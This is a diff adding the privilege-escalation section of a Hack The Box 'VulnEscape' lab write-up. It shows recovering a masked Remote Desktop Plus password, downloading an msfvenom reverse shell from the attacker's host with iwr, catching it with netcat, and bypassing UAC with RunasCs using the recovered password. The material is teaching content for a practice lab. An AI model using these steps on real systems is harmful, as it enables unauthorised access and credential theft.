@@ -201,7 +201,7 @@ I have no idea what the red text says, so I'll use ChatGPT to assist me there.
   </a>
 </p>
 
-Perfect, now we just have to log out and in again. Once again, we will be using the shortcut for this. With the windows key + x, we can open the "Quick Link Manu"
+Perfect, now we just have to log out and in again. Once again, we will be using the shortcut for this. With the `windows key + x`, we can open the "Quick Link Menu"
 
 <p align="center">
   <a href="/assets/images/VulnEscape/Captura9.png" class="glightbox">
@@ -274,8 +274,8 @@ It looks like we can use Edge. I'll try the hyperlink bypass featured in the git
 We can read files properly, and this is our user.txt
 
 <p align="center">
-  <a href="/assets/images/VulnEscape/Captura16.png" class="glightbox">
-    <img src="/assets/images/VulnEscape/Captura16.png" width="700">
+  <a href="/assets/images/VulnEscape/Captura17.png" class="glightbox">
+    <img src="/assets/images/VulnEscape/Captura17.png" width="700">
   </a>
 </p>
 
@@ -297,7 +297,7 @@ It downloaded but we can't execute it, we don't have permissions for it.
   </a>
 </p>
 
-Upon research, I discovered that the Kiosk User can be set up as "Assigned Access (Single-App Mode)" or "Multi-App".
+If we investigate a little bit about the Kiosk User, it can be set up as `"Assigned Access (Single-App Mode)"` or `"Multi-App"`.
 
 > *Assigned Access (Single-App Mode): This is the most restrictive method, ideal for public-facing devices. It runs a single Universal Windows Platform (UWP) app or Microsoft Edge in full-screen, rendering the Windows shell, taskbar, and desktop completely inaccessible.*
 
@@ -305,9 +305,9 @@ Upon research, I discovered that the Kiosk User can be set up as "Assigned Acces
 
 Because we can access the system settings and the control panel, as well as Microsoft Edge, it's safe to assume this is a Multi-App mode. Reading it's definition tells us that it works based on a whitelist of permitted applications.
 
-Knowing this, I'll be bypassing a whitelist. My first attempt will be to rename de executable to something that is inside the whitelist, for example msedge.exe, the executable of Micrososft Edge.
+Knowing this, I'll be bypassing a whitelist. My first attempt will be to rename de executable to something that is inside the whitelist, for example `msedge.exe`, the executable of Micrososft Edge.
 
-We'll right click and choose "Save link as" on our previously downloaded cmd.exe.
+We'll right click and choose `"Save link as"` on our previously downloaded cmd.exe.
 
 <p align="center">
   <a href="/assets/images/VulnEscape/Captura20.png" class="glightbox">
@@ -338,3 +338,493 @@ After this, we can see that our new download is now named msedge.exe, and it suc
 </p>
 
 ### Shell as admin
+
+We have achieved command execution now, we can do basic recon with what we have. I'll spawn powershell.
+
+whoami /all doesn't reveal anything interesting
+
+```powershell
+PS C:\Users\kioskUser0> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name         SID
+================= ==============================================
+escape\kioskuser0 S-1-5-21-3698417267-3345840482-3422164602-1002
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID          Attributes
+====================================== ================ ============ ==================================================
+Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\로컬 계정             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State
+============================= ==================================== ========
+SeShutdownPrivilege           Shut down the system                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeUndockPrivilege             Remove computer from docking station Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+SeTimeZonePrivilege           Change the time zone                 Disabled
+```
+
+I remember when achieving file read before, I saw a suspicious folder in `C:/` named `_admin`. It's hidden so we'll have to use gci -hidden to uncover it.
+
+```bash
+PS C:\> ls
+
+
+    Directory: C:\
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          2/3/2024   3:11 AM                inetpub
+d-----         12/7/2019   1:14 AM                PerfLogs
+d-r---         4/10/2025  11:29 PM                Program Files
+d-r---          2/3/2024   3:03 AM                Program Files (x86)
+d-r---          2/3/2024   3:43 AM                Users
+d-----         6/24/2025   1:24 PM                Windows
+
+
+PS C:\> gci -hidden
+
+
+    Directory: C:\
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d--hs-          2/4/2024  12:52 AM                $Recycle.Bin
+d--h--         6/24/2025   8:23 AM                $WinREAgent
+d--hsl          2/3/2024  11:32 AM                Documents and Settings
+d--h--         6/24/2025   8:06 AM                ProgramData
+d--hs-         10/1/2024  11:40 PM                Recovery
+d--hs-         6/16/2025   4:42 AM                System Volume Information
+d--h--          2/3/2024   3:05 AM                _admin
+-a-hs-          2/4/2024   1:35 AM           8192 DumpStack.log
+-a-hs-         2/21/2026   5:57 AM           8192 DumpStack.log.tmp
+-a-hs-         10/1/2024  11:48 PM     2093002752 hiberfil.sys
+-a-hs-         2/21/2026   5:57 AM     1476395008 pagefile.sys
+-a-hs-         2/21/2026   5:57 AM       16777216 swapfile.sys
+```
+
+Inside, we only have one interesting file as the other folders and files are empty.
+
+```powershell
+PS C:\> cd _admin
+PS C:\_admin> ls
+
+
+    Directory: C:\_admin
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          2/3/2024   3:04 AM                installers
+d-----          2/3/2024   3:05 AM                passwords
+d-----          2/3/2024   3:05 AM                temp
+-a----          2/3/2024   3:03 AM              0 Default.rdp
+-a----          2/3/2024   3:04 AM            574 profiles.xml
+
+
+PS C:\_admin> cat profiles.xml
+<?xml version="1.0" encoding="utf-16"?>
+<!-- Remote Desktop Plus -->
+<Data>
+  <Profile>
+    <ProfileName>admin</ProfileName>
+    <UserName>127.0.0.1</UserName>
+    <Password>JWqkl6IDfQxXXmiHIKIP8ca0G9XxnWQZgvtPgON2vWc=</Password>
+    <Secure>False</Secure>
+  </Profile>
+</Data>
+PS C:\_admin> ls
+```
+
+### Profiles.xml
+
+The .xml is a configuration file for a session for the user `admin` in the application `Remote Desktop Plus`. The password field seems base64 encoded.
+
+```bash
+┌──(kali㉿kali)-[~/hackthebox/vulnescape]
+└─$ echo 'JWqkl6IDfQxXXmiHIKIP8ca0G9XxnWQZgvtPgON2vWc=' | base64 -d         
+%j���}
+      W^h� ��ƴ��d��O��v�g
+```
+
+Decoding it shows me it's not plaintext, I'll use xxd and get the length to see if it's a hash.
+
+```bash
+┌──(kali㉿kali)-[~/hackthebox/vulnescape]
+└─$ echo 'JWqkl6IDfQxXXmiHIKIP8ca0G9XxnWQZgvtPgON2vWc=' | base64 -d | xxd   
+00000000: 256a a497 a203 7d0c 575e 6887 20a2 0ff1  %j....}.W^h. ...
+00000010: c6b4 1bd5 f19d 6419 82fb 4f80 e376 bd67  ......d...O..v.g
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/hackthebox/vulnescape]
+└─$ echo 'JWqkl6IDfQxXXmiHIKIP8ca0G9XxnWQZgvtPgON2vWc=' | base64 -d | wc -c
+32
+```
+
+Seeing the outputs makes me strongly believe this a hash, high entropy and 32 characters. I'll convert it to hex and see what I can do with hashcat.
+
+```bash
+┌──(kali㉿kali)-[~/hackthebox/vulnescape]
+└─$ echo 'JWqkl6IDfQxXXmiHIKIP8ca0G9XxnWQZgvtPgON2vWc=' | base64 -d | xxd -p
+256aa497a2037d0c575e688720a20ff1c6b41bd5f19d641982fb4f80e376bd67
+```
+
+With hashid, we can see we've got some candidates.
+
+```bash
+┌──(kali㉿kali)-[~/hackthebox/vulnescape]
+└─$ echo '256aa497a2037d0c575e688720a20ff1c6b41bd5f19d641982fb4f80e376bd67' | hashid
+Analyzing '256aa497a2037d0c575e688720a20ff1c6b41bd5f19d641982fb4f80e376bd67'
+[+] Snefru-256 
+[+] SHA-256 
+[+] RIPEMD-256 
+[+] Haval-256 
+[+] GOST R 34.11-94 
+[+] GOST CryptoPro S-Box 
+[+] SHA3-256 
+[+] Skein-256 
+[+] Skein-512(256)
+```
+
+The most common here would be SHA-256, so I'll try that.
+
+```powershell
+Approaching final keyspace - workload adjusted.
+
+Session..........: hashcat
+Status...........: Exhausted
+Hash.Mode........: 1400 (SHA2-256)
+Hash.Target......: 256aa497a2037d0c575e688720a20ff1c6b41bd5f19d641982f...76bd67
+Time.Started.....: Sat Feb 21 15:24:49 2026, (2 secs)
+Time.Estimated...: Sat Feb 21 15:24:51 2026, (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (.\rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  8077.6 kH/s (1.73ms) @ Accel:512 Loops:1 Thr:64 Vec:1
+Speed.#2.........:  1908.0 kH/s (10.11ms) @ Accel:128 Loops:1 Thr:64 Vec:1
+Speed.#*.........:  9985.6 kH/s
+Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
+Progress.........: 14344384/14344384 (100.00%)
+Rejected.........: 0/14344384 (0.00%)
+Restore.Point....: 14196588/14344384 (98.97%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: 0302146 -> 015601
+Candidates.#2....: $HEX[30313536303034] -> $HEX[042a0337c2a156616d6f732103]
+Hardware.Mon.#1..: Temp: 52c Util: 13% Core:1394MHz Mem:6114MHz Bus:16
+Hardware.Mon.#2..: N/A
+
+Started: Sat Feb 21 15:24:46 2026
+Stopped: Sat Feb 21 15:24:53 2026
+PS Z:\folder\hashcat>
+```
+
+It didn't crack, so I tought about using the config file directly in the application it's meant for. I'll look for `Remote Desktop Plus`.
+
+Because the machine is small, it was easy to find. Usually applications sit in either `"Program Files"` or `"Program Files (x86)"`
+
+```powershell
+PS C:\Program Files (x86)> ls
+
+
+    Directory: C:\Program Files (x86)
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         12/7/2019   1:31 AM                Common Files
+d-----         6/24/2025   1:19 PM                Internet Explorer
+d-----          2/3/2024   3:14 AM                Microsoft
+d-----         12/7/2019   1:31 AM                Microsoft.NET
+d-----          2/3/2024   3:03 AM                Remote Desktop Plus
+d-----         6/24/2025  10:10 AM                Windows Defender
+d-----          2/3/2024   3:07 AM                Windows Mail
+d-----         6/24/2025  10:10 AM                Windows Media Player
+d-----         6/24/2025   1:19 PM                Windows Multimedia Platform
+d-----         12/7/2019   1:50 AM                Windows NT
+d-----         6/24/2025  10:10 AM                Windows Photo Viewer
+d-----         6/24/2025   1:19 PM                Windows Portable Devices
+d-----         12/7/2019   1:31 AM                WindowsPowerShell
+```
+
+It's just and .exe, so we'll execute it directly.
+
+```powershell
+PS C:\Program Files (x86)> cd '.\Remote Desktop Plus\'
+PS C:\Program Files (x86)\Remote Desktop Plus> ls
+
+
+    Directory: C:\Program Files (x86)\Remote Desktop Plus
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         3/13/2018  10:47 PM         267264 rdp.exe
+
+PS C:\Program Files (x86)\Remote Desktop Plus> .\rdp.exe
+```
+
+<p align="center">
+  <a href="/assets/images/VulnEscape/Captura28.png" class="glightbox">
+    <img src="/assets/images/VulnEscape/Captura28.png" width="700">
+  </a>
+</p>
+
+### Remote Desktop Plus
+
+A very simple application, to import the xml we'll click on `Manage Profiles`.
+
+<p align="center">
+  <a href="/assets/images/VulnEscape/Captura29.png" class="glightbox">
+    <img src="/assets/images/VulnEscape/Captura29.png" width="700">
+  </a>
+</p>
+
+And then on `Import and Export`, I'll select Import Profiles.
+
+<p align="center">
+  <a href="/assets/images/VulnEscape/Captura30.png" class="glightbox">
+    <img src="/assets/images/VulnEscape/Captura30.png" width="700">
+  </a>
+</p>
+
+Unfortunately, we only have access to Downloads with a file explorer.
+
+<p align="center">
+  <a href="/assets/images/VulnEscape/Captura31.png" class="glightbox">
+    <img src="/assets/images/VulnEscape/Captura31.png" width="700">
+  </a>
+</p>
+
+I'll apply the same trick I used for cmd.exe, and download profiles.xml through Microsoft Edge.
+
+<p align="center">
+  <a href="/assets/images/VulnEscape/Captura32.png" class="glightbox">
+    <img src="/assets/images/VulnEscape/Captura32.png" width="700">
+  </a>
+</p>
+
+Now that it is in Downloads, we can import it.
+
+<p align="center">
+  <a href="/assets/images/VulnEscape/Captura33.png" class="glightbox">
+    <img src="/assets/images/VulnEscape/Captura33.png" width="700">
+  </a>
+</p>
+
+<p align="center">
+  <a href="/assets/images/VulnEscape/Captura34.png" class="glightbox">
+    <img src="/assets/images/VulnEscape/Captura34.png" width="700">
+  </a>
+</p>
+
+Sadly, the password is hidden and I can't copy paste it and trying to use the given session to connect will output an error.
+
+<p align="center">
+  <a href="/assets/images/VulnEscape/Captura35.png" class="glightbox">
+    <img src="/assets/images/VulnEscape/Captura35.png" width="700">
+  </a>
+</p>
+
+<p align="center">
+  <a href="/assets/images/VulnEscape/Captura36.png" class="glightbox">
+    <img src="/assets/images/VulnEscape/Captura36.png" width="700">
+  </a>
+</p>
+
+### BulletPassView
+
+Searching around for alternatives, I found the utility [`BulletPassView`](https://www.nirsoft.net/utils/bullets_password_view.html) from NirSoft. It's a very simple application that uncovers passwords hidden with bullets in applications in Windows.
+
+To get the utility, simply download the .zip given in the page for x64 version. We'll transfer it from our kali.
+
+```powershell
+PS C:\Users\kioskUser0> iwr -uri http://10.10.14.16/BulletsPassView.exe -o BulletsPassView.exe
+PS C:\Users\kioskUser0> ls
+
+
+    Directory: C:\Users\kioskUser0
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-r---          2/3/2024   3:10 AM                3D Objects
+d-r---          2/3/2024   3:10 AM                Contacts
+d-r---         6/24/2025   7:31 AM                Desktop
+d-r---         2/21/2026   6:34 AM                Documents
+d-r---         2/21/2026   6:36 AM                Downloads
+d-r---          2/3/2024   3:10 AM                Favorites
+d-r---          2/3/2024   3:10 AM                Links
+d-r---          2/3/2024   3:10 AM                Music
+d-r---          2/3/2024   3:10 AM                Pictures
+d-r---          2/3/2024   3:10 AM                Saved Games
+d-r---          2/3/2024   3:10 AM                Searches
+d-r---          2/3/2024   3:10 AM                Videos
+-a----         2/21/2026   6:56 AM          98400 BulletsPassView.exe
+
+PS C:\Users\kioskUser0> .\BulletsPassView.exe
+```
+
+Upon execution, and tinkering a little bit with Remote Desktop Plus, we have our password.
+
+<p align="center">
+  <a href="/assets/images/VulnEscape/Captura37.png" class="glightbox">
+    <img src="/assets/images/VulnEscape/Captura37.png" width="700">
+  </a>
+</p>
+
+We can simply use the newly obtained credentials with [Runas](https://github.com/antonioCoco/RunasCs).
+
+I'll place a shell in C:\Users\Public generated with msfvenom to easily get a reverse shell.
+
+```powershell
+PS C:\Users\Public> iwr -uri http://10.10.14.16/shell.exe -o shell.exe
+PS C:\Users\Public> ls
+
+
+    Directory: C:\Users\Public
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-r---          2/3/2024  11:32 AM                Documents
+d-r---         12/7/2019   1:14 AM                Downloads
+d-r---         12/7/2019   1:14 AM                Music
+d-r---         12/7/2019   1:14 AM                Pictures
+d-r---         12/7/2019   1:14 AM                Videos
+-a----         2/21/2026   7:04 AM           7168 shell.exe
+```
+
+We receive a shell in our listener.
+
+```bash
+┌──(kali㉿kali)-[~/hackthebox/vulnescape]
+└─$ nc -lvnp 9001           
+listening on [any] 9001 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.129.234.51] 50205
+Microsoft Windows [Version 10.0.19045.5965]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+escape\admin
+```
+
+However, when trying to access the flag, we don't have permissions for it. This is because of the [UAC](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/)
+
+```powershell
+PS C:\Users\Administrator> ls
+ls
+ls : Access to the path 'C:\Users\Administrator' is denied.
+At line:1 char:1
++ ls
++ ~~
+    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator:String) [Get-ChildItem], UnauthorizedAccessException
+    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+```
+
+```powershell
+PS C:\Users\kioskUser0> .\RunasCs.exe admin Twisting3021 C:\Users\Public\shell.exe
+[*] Warning: The logon for user 'admin' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
+```
+
+Actually, Runas is warning us about this, and it's just about adding a couple of flags to obtain our missed privileges.
+
+```powershell
+PS C:\Users\kioskUser0> .\RunasCs.exe admin Twisting3021 C:\Users\Public\shell.exe --bypass-uac --logon-type '8'
+```
+
+And now our newly acquired shell works with all the privileges.
+
+```bash
+┌──(kali㉿kali)-[~/hackthebox/vulnescape]
+└─$ nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.129.234.51] 50206
+Microsoft Windows [Version 10.0.19045.5965]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+escape\admin
+
+C:\Windows\system32>cd /Users
+cd /Users
+
+C:\Users>powershell
+powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\Users> ls
+    Directory: C:\Users
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-----          2/3/2024   2:39 AM                admin                                                                
+d-----         6/25/2025   2:45 AM                Administrator                                                        
+d-----          2/3/2024   3:12 AM                DefaultAppPool                                                       
+d-----         2/21/2026   7:02 AM                kioskUser0                                                           
+d-r---         2/21/2026   7:06 AM                Public                                                               
+
+
+PS C:\Users> cd Administrator
+PS C:\Users\Administrator> ls
+
+    Directory: C:\Users\Administrator
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+d-r---          2/3/2024   3:43 AM                3D Objects                                                           
+d-r---          2/3/2024   3:43 AM                Contacts                                                             
+d-r---          2/3/2024   3:44 AM                Desktop                                                              
+d-r---          2/3/2024   3:43 AM                Documents                                                            
+d-r---         6/25/2025   2:40 AM                Downloads                                                            
+d-r---          2/3/2024   3:43 AM                Favorites                                                            
+d-r---          2/3/2024   3:43 AM                Links                                                                
+d-r---          2/3/2024   3:43 AM                Music                                                                
+d-r---          2/3/2024   3:44 AM                OneDrive                                                             
+d-r---          2/3/2024   3:44 AM                Pictures                                                             
+d-r---          2/3/2024   3:43 AM                Saved Games                                                          
+d-r---          2/3/2024   3:44 AM                Searches                                                             
+d-r---          2/3/2024   3:43 AM                Videos                                                               
+
+PS C:\Users\Administrator> cd Desktop
+PS C:\Users\Administrator\Desktop> ls
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----          2/3/2024   9:07 AM           2332 Microsoft Edge.lnk                                                   
+-ar---         2/21/2026   5:58 AM             34 root.txt                                                             
+
+```
+
